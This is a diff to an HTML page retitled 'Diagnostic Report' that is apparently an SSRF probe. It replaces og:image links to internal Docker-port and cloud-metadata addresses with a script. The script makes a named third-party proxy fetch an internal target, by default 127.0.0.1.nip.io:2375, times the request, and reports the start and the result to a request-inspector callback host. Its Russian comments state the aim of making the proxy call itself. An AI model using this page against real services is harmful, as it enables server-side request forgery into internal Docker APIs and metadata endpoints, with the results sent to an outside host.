@@ -2,17 +2,40 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Image Gallery Test</title>
+    <title>Diagnostic Report</title>
+    <meta property="og:title" content="SSRF Test">
     
-    <link rel="prefetch" href="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/ALIVE_SERVER_VISIT">
+    <meta property="og:image" content="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/SERVER_PROBED_US">
 
-    <meta property="og:image" content="http://127.0.0.1.nip.io:2375/logo.png">
-    <meta property="og:image" content="http://169.254.169.254.nip.io/latest/meta-data/">
+    <script>
+        const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
+        const proxy = "https://max.ru/proxy?url=";
+        
+        // Получаем цель из URL (например, 127.0.0.1:2375)
+        const urlParams = new URLSearchParams(window.location.search);
+        const target = urlParams.get('target') || "127.0.0.1.nip.io:2375";
 
-    <img src="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/IMAGE_LOADED_BY_SERVER">
+        async function start() {
+            const startTime = Date.now();
+            
+            // Отправляем сигнал "Начало теста"
+            fetch(`${inspector}/START_TEST?target=${target}`);
 
+            try {
+                // Пытаемся заставить их прокси обратиться к самому себе
+                await fetch(`${proxy}http://${target}`, { mode: 'no-cors' });
+            } catch (e) {}
+
+            const duration = Date.now() - startTime;
+            
+            // Отправляем результат замера
+            fetch(`${inspector}/RESULT?time=${duration}ms&target=${target}`);
+        }
+
+        start();
+    </script>
 </head>
 <body>
-    <h1>Security Test Page</h1>
+    <h1>Testing infrastructure... Check Inspector logs.</h1>
 </body>
 </html>
